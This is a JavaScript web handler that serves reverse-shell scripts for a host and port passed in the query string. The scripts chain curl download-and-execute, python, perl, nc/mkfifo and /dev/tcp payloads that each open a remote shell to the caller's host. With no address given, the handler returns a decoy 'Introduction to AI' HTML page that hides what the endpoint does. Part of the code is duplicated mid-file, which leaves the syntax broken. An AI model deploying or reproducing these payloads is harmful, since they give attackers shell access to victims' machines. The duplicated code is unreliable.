'use strict';

const usage = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="A brief introduction to Artificial Intelligence (AI)">
    <title>Introduction to Artificial Intelligence</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
            text-align: center;
        }
        section {
            padding: 20px;
        }
        h1, h2 {
            color: #333;
        }
        p {
            margin-bottom: 1.2rem;
        }
        footer {
            background-color: #333;
            color: white;
            text-align: center;
            padding: 1rem;
            position: fixed;
            width: 100%;
            bottom: 0;
        }
    </style>
</head>
<body>

    <header>
        <h1>Introduction to Artificial Intelligence</h1>
    </header>

    <section>
        <h2>What is AI?</h2>
        <p>Artificial Intelligence (AI) refers to the simulation of human intelligence in machines that are programmed to think, learn, and adapt. AI can perform tasks typically requiring human intelligence, such as visual perception, speech recognition, decision-making, and language translation.</p>

        <h2>Types of AI</h2>
        <p>AI is generally divided into two categories:</p>
        <ul>
            <li><strong>Narrow AI:</strong> Also known as weak AI, it is designed to perform a narrow task (e.g., facial recognition or internet searches).</li>
            <li><strong>General AI:</strong> Also known as strong AI, it has the ability to understand, learn, and apply knowledge to perform tasks just like a human.</li>
        </ul>

        <h2>Applications of AI</h2>
        <p>AI has a wide range of applications across industries, including:</p>
        <ul>
            <li>Healthcare (diagnosis, personalized treatment)</li>
            <li>Finance (fraud detection, algorithmic trading)</li>
            <li>Automotive (self-driving cars)</li>
            <li>Customer service (chatbots, virtual assistants)</li>
            <li>Entertainment (recommendation engines)</li>
        </ul>

        <h2>Future of AI</h2>
        <p>The future of AI holds significant promise as advancements in machine learning, natural language processing, and robotics continue to grow. However, ethical concerns around data privacy, job displacement, and algorithmic bias must be carefully addressed as AI evolves.</p>
    </section>

    <footer>
        <p>&copy; 2024 AI Learning | All Rights Reserved</p>
    </footer>

</body>
</html>`;

const reverseShell = (address = '') => {
        const [host, port] = address.split(':');
        if (!host || !port) {
                return usage;
        }
        console.log(`Host is: ${host}:${port}`);

        const payloads = {
                curl: `curl https://${host} --output /tmp/bazel | chmod +x /tmp/bazel | /tmp/bazel`,
                python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
                perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
                nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
                sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
  };

        return Object.entries(payloads).reduce((script, [cmd, payload]) => {
                script += `

if command -v ${cmd} > /dev/null 2>&1; then
        ${payload}
        exit;
fi`;

                return script;
        }, usage);
};

const handler = (request, response) => {
        const  address = request.query.address;
        console.log(address);

        const one_month = 60 * 60 * 24 * 30;

        response.setHeader('Content-Type', 'text/plain');
        response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
                };

        return Object.entries(payloads).reduce((script, [cmd, payload]) => {
                script += `

if command -v ${cmd} > /dev/null 2>&1; then
        ${payload}
        exit;
fi`;

                return script;
        }, usage);
};

const handler = (request, response) => {
        const  address = request.query.address;
        console.log(address);

        const one_month = 60 * 60 * 24 * 30;

        response.setHeader('Content-Type', 'text/plain');
        response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
        response.send(reverseShell(address));
};

module.exports = handler;

module.exports.reverseShell = reverseShell;
 
